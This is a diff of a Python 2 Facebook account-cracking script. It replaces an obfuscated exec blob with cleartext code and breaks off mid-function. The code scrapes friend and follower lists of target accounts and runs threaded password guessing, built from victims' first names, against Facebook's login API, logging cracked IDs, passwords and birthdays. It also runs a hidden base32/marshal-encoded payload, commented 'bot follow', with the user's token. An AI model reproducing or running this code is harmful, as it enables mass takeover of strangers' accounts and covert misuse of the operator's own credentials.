@@ -1,4 +1,523 @@
-#Encrypted By MAFIA-KILLER
-#WHATSAPP : +92132197796/DON,T TRY TO EDIT THIS TOOL/
-import zlib, base64
-exec(zlib.decompress(base64.b64decode("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")))
+# -*- coding: utf-8
+# author by Mark Cornel
+import os
+try:
+	import requests
+except ImportError:
+	os.system("pip2 install requests")
+ 
+try:
+	import bs4
+except ImportError:
+	os.system("pip2 install bs4")
+ 
+import os, sys, re, time, requests, json, random, calendar
+from multiprocessing.pool import ThreadPool
+from bs4 import BeautifulSoup as parser
+from datetime import datetime
+from datetime import date
+ 
+loop = 0
+id = []
+ok = []
+cp = []
+ 
+ct = datetime.now()
+n = ct.month
+bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
+try:
+    if n < 0 or n > 12:
+        exit()
+    nTemp = n - 1
+except ValueError:
+    exit()
+ 
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+op = bulan[nTemp]
+ 
+my_date = date.today()
+hr = calendar.day_name[my_date.weekday()]
+tBilall = ("%s-%s-%s-%s"%(hr, ha, op, ta))
+tgl = ("%s %s %s"%(ha, op, ta))
+bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
+ 
+def logo():
+	os.system("clear")
+	print("""\033[1;93m
+ /$$      /$$  /$$$$$$  /$$$$$$$  /$$   /$$
+| $$$    /$$$ /$$__  $$| $$__  $$| $$  /$$/
+| $$$$  /$$$$| $$  \ $$| $$  \ $$| $$ /$$/ 
+| $$ $$/$$ $$| $$$$$$$$| $$$$$$$/| $$$$$/  
+| $$  $$$| $$| $$__  $$| $$__  $$| $$  $$  
+| $$\  $ | $$| $$  | $$| $$  \ $$| $$\  $$ 
+| $$ \/  | $$| $$  | $$| $$  | $$| $$ \  $$
+|__/     |__/|__/  |__/|__/  |__/|__/  \__/
+                                           
+""")
+ 
+CorrectUsername = "MEMO"
+CorrectPassword = "POWER"
+
+loop = 'true'
+while (loop == 'true'):
+    username = raw_input("\033[1;92m[+] \033[1;96m \x1b[1;95mTool Username \x1b[1;91m: \x1b[1;96m")
+    if (username == CorrectUsername):
+    	password = raw_input("\033[1;96m[+] \033[1;96m \x1b[1;92mTool Password \x1b[1;91m: \x1b[1;96m")
+        if (password == CorrectPassword):
+            print "Logged in successfully as " + username #DevMark_Cornel
+	    time.sleep(2)
+            loop = 'false'
+        else:
+            print "\033[1;97mWrong Password"
+            os.system('xdg-open https://www.facebook.com/Mark.Cornel666')
+    else:
+        print "\033[1;97mWrong Username"
+        os.system('xdg-open https://www.facebook.com/Mark.Cornel666')
+idh = []
+
+def login():
+	os.system("clear")
+	try:
+		#-> test koneksi
+		requests.get("https://mbasic.facebook.com")
+	except requests.exceptions.ConnectionError:
+		exit("")
+	try:
+		token = open("login.txt", "r")
+		menu()
+	except KeyError, IOError:
+		token = raw_input("\033[1;97m[\033[1;94m+\033[1;97m] Enter Token : ")
+		if token == "help":
+			exit(" ! di simak video nya biar paham")
+		try:
+			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
+			open("login.txt", "w").write(token)
+			#-> bot follow
+			import marshal,zlib,base64
+			exec(marshal.loads(zlib.decompress(base64.b32decode("PCOKLEW7J3BSAFEHUHN5I6HHSWX5BK7V2BJKBRVJC5PHXYYDTCLOFZXGUT3NAJ7QYU6ZRKKJCP7SJBPQBN6MABZELB3CQM3KG7KHAS7BDDNXFVSSE5Q6O3446EB6AY4QRTAWYDHGMOYPQAXNCG5U7D7DTG3RJGYQHK6MRMTVL53ZXZLDNVO6H7LONH6T4EYAEBFNARIJBJKJ5YOQUDWZ6GWX4N2W3LKDPQEH5Z26K37RCQJOKQQYYVRFJQJ6LOMRSXKFAVITIWBBI5A7VG2JZ6FUAJFGGRFBUX4ULNH2KMSJIMGVZ6DLWND6SZYEFUN327AWDQBQU5A6OMMEIWOIVS6S7CV34AYTRJ3P3MPLOLX5XYOZLXY4QTZJZ34GO7IHIDRKZWQ="))))
+			time.sleep(1)
+			menu()
+		except KeyError:
+			os.system("rm -f login.txt")
+			exit("\033[1;97m[\033[1;94m?\033[1;97m] Login Error")
+ 
+def menu():
+	os.system("clear")
+	global token
+	try:
+		token = open("login.txt","r").read()
+	except KeyError:
+		os.system("rm -f login.txt")
+		exit("\033[1;97m[\033[1;94m?\033[1;97m] Login Error")
+	try:
+		nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
+	except IOError:
+		os.system("rm -f login.txt")
+		exit("\033[1;97m[\033[1;94m?\033[1;97m] Login Error")
+	except requests.exceptions.ConnectionError:
+		exit("\033[1;97m[\033[1;94m?\033[1;97m] Internet Error")
+	logo()
+	print("\n\033[1;97m[\033[1;94m01\033[1;97m] Crack Id From Public/Friends")
+	print("\033[1;97m[\033[1;94m02\033[1;97m] Crack Id From Followers")
+	print("\033[1;97m[\033[1;94m03\033[1;97m] Multi Crack\033[1;97m [ \033[1;95mPro \033[1;97m]")
+	print("\033[1;97m[\033[1;94m04\033[1;97m] Chack Crack Results")
+	print("\033[1;97m[\033[1;94m05\033[1;97m] User-Agent Settings\033[1;97m [ \033[1;95mPro \033[1;97m]")
+	print("\033[1;97m[\033[1;94m00\033[1;97m] Exit\033[1;97m [ \033[1;91mDelete Token \033[1;97m]")
+	Bilal = raw_input("\n\033[1;97m[\033[1;94m+\033[1;97m] Chouse : ")
+	if Bilal =="":
+		menu()
+	elif Bilal == "1" or Bilal == "01":
+		publik()
+		method()
+	elif Bilal == "2" or Bilal == "02":
+		follower()
+		method()
+	elif Bilal == "3" or Bilal == "03":
+		massal()
+		method()
+	elif Bilal == "4" or Bilal == "04":
+		print("\n\033[1;97m[\033[1;94m01\033[1;97m] Chack Result OK")
+		print("\033[1;97m[\033[1;94m02\033[1;97m] Chack Result CP")
+		cek = raw_input("\n\033[1;97m[\033[1;94m+\033[1;97m] Chouse : ")
+		if cek =="":
+			menu()
+		elif cek == "1":
+			dirs = os.listdir("OK")
+			print("\033[1;97m[\033[1;94m+\033[1;97m] Copy File Name  And Past into Input")
+			for file in dirs:
+				print("[•]  "+file)
+			try:
+				file = raw_input("\n\033[1;97m[\033[1;94m+\033[1;97m] File Name : ")
+				if file == "":
+					menu()
+				Totalok = open("OK/%s"%(file)).read().splitlines()
+			except IOError:
+				exit(" ! file %s tidak tersedia"%(file))
+			nm_file = ("%s"%(file)).replace("-", " ")
+			del_txt = nm_file.replace(".txt", "")
+			print(" # ----------------------------------------------")
+			print(" Crack Resulte : %s Total : %s\033[0;92m"%(del_txt, len(totalok)))
+			os.system("cat OK/%s"%(file))
+			print(" \033[0;97m # ----------------------------------------------")
+			exit(" ")
+		elif cek == "2":
+			dirs = os.listdir("CP")
+			print("\033[1;97m[\033[1;94m+\033[1;97m] Copy File Name And Past into Input")
+			for file in dirs:
+				print(" + "+file)
+			try:
+				file = raw_input("\n\033[1;97m[\033[1;94m+\033[1;97m] File Name : ")
+				if file == "":
+					menu()
+				Totalcp = open("CP/%s"%(file)).read().splitlines()
+			except IOError:
+				exit(" ! file %s tidak tersedia"%(file))
+			nm_file = ("%s"%(file)).replace("-", " ")
+			del_txt = nm_file.replace(".txt", "")
+			print("# ----------------------------------------------")
+			print("Total Ids : %s\033[0;93m"%(del_txt, len(totalcp)))
+			os.system("cat CP/%s"%(file))
+			print("\033[0;97m # ----------------------------------------------")
+			exit(" ")
+		else:
+			menu()
+	elif Bilal == "5" or Bilal == "05":
+		setting_ua()
+	elif Bilal == "0" or Bilal == "00":
+		os.system("rm -f login.txt")
+		exit("\033[1;97m[\033[1;94m+\033[1;97m] Token Removed")
+	else:
+		menu()
+ 
+def publik():
+	global token
+	try:
+		token = open("login.txt", "r").read()
+	except IOError:
+		exit("[?] Token Error")
+	idt = raw_input("\033[1;97m[\033[1;94m+\033[1;97m] Target Id : ")
+	try:
+		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
+			uid = i["id"]
+			nama = i["name"].rsplit(" ")[0]
+			id.append(uid+"<=>"+nama)
+	except KeyError:
+		exit("[")
+	print("\033[1;97m[\033[1;94m+\033[1;97m] Total ids  : \033[0;91m%s\033[0;97m"%(len(id))) 
+ 
+def follower():
+	global token
+	try:
+		token = open("login.txt", "r").read()
+	except IOError:
+		exit("\033[1;97m[\033[1;94m+\033[1;97m] Token Error")
+	idt = raw_input("\033[1;97m[\033[1;94m+\033[1;97m] Targit Id : ")
+	try:
+		for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
+			uid = i["id"]
+			nama = i["name"].rsplit(" ")[0]
+			id.append(uid+"<=>"+nama)
+	except KeyError:
+		exit("\033[1;97m[\033[1;94m+\033[1;97m] Account Friend lost Is Not Public")
+	print("\033[1;97m[\033[1;94m+\033[1;97m] Total id  : \033[0;91m%s\033[0;97m"%(len(id))) 
+ 
+def massal():
+	global token
+	try:
+		token = open("login.txt", "r").read()
+	except IOError:
+		exit(" ! token kadaluwarsa")
+	try:
+		tanya_total = int(input("\033[1;97m[\033[1;94m+\033[1;97m] Target Accounts Amount : "))
+	except:tanya_total=1
+	for t in range(tanya_total):
+		t +=1
+		idt = raw_input("\033[1;97m[\033[1;94m+\033[1;97m] Target Id %s : "%(t))
+		try:
+			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
+				uid = i["id"]
+				nama = i["name"].rsplit(" ")[0]
+				id.append(uid+"<=>"+nama)
+		except KeyError:
+			print("\033[1;97m[\033[1;94m+\033[1;97m] Account Friend list Is not Public")
+	print("\033[1;97m[\033[1;94m+\033[1;97m] Total id  : \033[0;91m%s\033[0;97m"%(len(id))) 
+ 
+def method():
+	print("\n\033[1;97m[\033[1;94m?\033[1;97m] Choose Cracking Mathod")
+	print("\033[1;97m[\033[1;94m1\033[1;97m] B-Api\033[1;97m [ \033[1;95mFast \033[1;97m]")
+	print("\033[1;97m[\033[1;94m2\033[1;97m] Mbasic\033[1;97m [ \033[1;95mSlow \033[1;97m]")
+	print("\033[1;97m[\033[1;94m3\033[1;97m] Free Facebook\033[1;97m [ \033[1;95mSuper Slow \033[1;97m]")
+	method = raw_input("\033[1;97m[\033[1;94m?\033[1;97m] Choose : ")
+	if method == "":
+		menu()
+	elif method == "1":
+		ask = raw_input("\n\033[1;97m[\033[1;94m!\033[1;97m] Do you Choose Manual Password y/t\033[1;97m [ \033[1;95mDefault : t \033[1;97m] : ")
+		if ask == "y":
+			
+			manual()
+		ThreadPool(30).map(bapi, id)
+		exit("\n ####  PROGRAM CLOSE")
+	elif method == "2":
+		ask = raw_input("\n\033[1;92m[\033[1;94m!\033[1;97m] Do you Choose Manual Password y/t\033[1;97m [ \033[1;95mDefault : t \033[1;97m] : ")
+		if ask == "y":
+			manual()
+			
+		ThreadPool(30).map(mbasic, id)
+		exit("\n ####  PROGRAM CLOSE")
+	elif method == "3":
+		ask = raw_input("\n\033[1;92m[\033[1;94m!\033[1;97m] Do you Choose Manual Password y/t\033[1;97m [ \033[1;95mDefault : t \033[1;97m] : ")
+		if ask == "y":
+			manual()
+		ThreadPool(30).map(mobile, id)
+		exit("\n ####    PROGRAM END")
+	else:
+		menu()
+ 
+def cek_ttl_cp(uid, pw):
+	try:
+		token = open("login.txt", "r").read()
+		with requests.Session() as ses:
+			ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
+			month, day, year = ttl.split("/")
+			month = bulan_ttl[month]
+			print("\r\033[0;95m[GUPTA-CP] %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
+			cp.append("%s|%s"%(uid, pw))
+			open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
+	except KeyError, IOError:
+		day = (" ")
+		month = (" ")
+		year = (" ")
+	except:pass
+ 
+def bapi(user):
+	try:
+		ua = open(".ua", "r").read()
+	except IOError:
+		ua = ("Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16;]")
+	global loop, token
+	sys.stdout.write(
+		"\r\033[0;91m[\033[0;92mCracking\033[0;91m]\033[0;97m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
+	); sys.stdout.flush()
+	uid, name = user.split("<=>")
+	if len(name)>=6:
+		pwx = [ name, name+"123", name+"1234", name+"12345", name+"786" ]
+	elif len(name)<=2:
+		pwx = [ name+"123", name+"1234", name+"12345", "223344" ]
+	elif len(name)<=3:
+		pwx = [ name+"123", name+"12345", name+"123" ]
+	else:
+		pwx = [ name+"123", name+"12345", "334455" ]
+	try:
+		for pw in pwx:
+			pw = pw.lower()
+			ses = requests.Session()
+			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
+			send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
+			if "session_key" in send.text and "EAAA" in send.text:
+				print("\r\033[0;92m[GUPTA-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
+				ok.append("%s|%s"%(uid, pw))
